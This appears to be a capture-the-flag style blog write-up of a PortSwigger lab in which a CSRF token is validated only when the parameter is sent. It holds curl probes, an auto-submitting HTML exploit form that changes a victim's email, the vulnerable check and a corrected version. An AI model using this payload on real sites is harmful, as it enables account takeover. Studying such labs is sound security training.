---
layout: post
title: "CSRF Token Validation Depends on Token Being Present"
date: 2027-06-25 09:00:00 -0500
categories: [PortSwigger, CSRF]
tags: [portswigger, csrf, cwe-352, web, practitioner, token-bypass]
---

## Overview

PortSwigger Web Security Academy lab — *CSRF where token validation depends on token being present* (Practitioner).

The app's email-change endpoint has a CSRF token mechanism, but only validates the token when the `csrf` parameter is actually included in the POST body. Removing the field entirely bypasses the check — the server falls through and processes the request without any proof of intent. This is a subtler flaw than having no token at all: sending a *wrong* token returns `400`, but sending *no* token returns `302`.

---

## The technique

[Cross-Site Request Forgery (CWE-352)](https://cwe.mitre.org/data/definitions/352.html) abuses the browser's automatic cookie-attachment behavior. Every HTTP request to a domain carries all session cookies regardless of which page initiated the request. When a state-changing endpoint requires nothing more than a valid session cookie, any page the victim visits can silently trigger authenticated actions on their behalf.

The standard defense is a per-request CSRF token — an unpredictable value tied to the session that must be echoed back in every state-changing request. The critical correctness property is: **the server must reject the request if the token is absent**, not just if it's wrong. An implementation that only validates `if (token is present)` treats absence and presence-with-valid-token identically, which is the same as no protection at all.

---

## Solution

**Probe the bypass:** confirm the token check is conditional before building the exploit.

```bash
# Wrong token → 400 (validation runs and rejects)
curl -s -X POST 'https://TARGET.web-security-academy.net/my-account/change-email' \
  -b cookies.txt \
  -d 'email=test@evil.com&csrf=WRONGTOKEN' \
  -o /dev/null -w '%{http_code}'
# → 400

# No token at all → 302 (validation branch never reached)
curl -s -X POST 'https://TARGET.web-security-academy.net/my-account/change-email' \
  -b cookies.txt \
  -d 'email=test@evil.com' \
  -o /dev/null -w '%{http_code}'
# → 302  ← bypass confirmed
```

**Build and deliver the exploit:** host an auto-submitting form on the exploit server with no `csrf` field.

```html
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

Store this as `/exploit` on the exploit server, then deliver to victim:

```bash
curl -L 'https://exploit-SERVER.exploit-server.net/deliver-to-victim'
```

The victim's browser loads the page, the script fires, and the browser automatically attaches the victim's session cookie to the cross-origin POST. The server skips the CSRF check (no `csrf` parameter in the body) and changes the email. Lab status flips to `is-solved`.

---

## Why it worked

The server's validation logic is conditionally structured:

```python
if request.POST.get('csrf'):          # only runs when the key IS present
    if request.POST['csrf'] != session['csrf_token']:
        return 400
# no csrf param → falls through → request accepted
```

The `if` guard treats an absent parameter the same as a valid one. The token is only checked when it arrives — omitting it entirely sidesteps the branch.

---

## Fix

Always require the CSRF token — treat absent as equally invalid to wrong:

```python
token = request.POST.get('csrf')
if not token or token != session['csrf_token']:
    return 403
```

Prefer a framework-level CSRF middleware that enforces this on every non-safe method rather than inline conditionals — inline checks are easy to accidentally make optional. Pair with `SameSite=Strict` or `SameSite=Lax` session cookies as defence-in-depth.

**Reference:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
